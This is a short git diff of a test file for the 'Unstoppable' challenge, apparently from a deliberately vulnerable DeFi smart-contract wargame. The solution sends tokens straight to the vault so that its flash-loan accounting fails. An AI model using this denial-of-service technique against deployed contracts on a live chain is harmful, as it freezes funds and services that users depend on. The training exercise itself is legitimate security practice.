@@ -51,18 +51,12 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        const AttackContractFactory = await ethers.getContractFactory(
-            'AttackUnstoppable'
-        )
-        const AttackContract = await AttackContractFactory.deploy(
-            vault.address,
-            token.address
-        )
 
         const tx = {
-            to: AttackContract.address,
-            data: AttackContract.interface.encodeFunctionData('executeFlashLoan', [
-                TOKENS_IN_VAULT
+            to: token.address,
+            data: token.interface.encodeFunctionData('transfer', [
+                vault.address,
+                INITIAL_PLAYER_TOKEN_BALANCE
             ]),
             gasLimit: 30000000n
         }
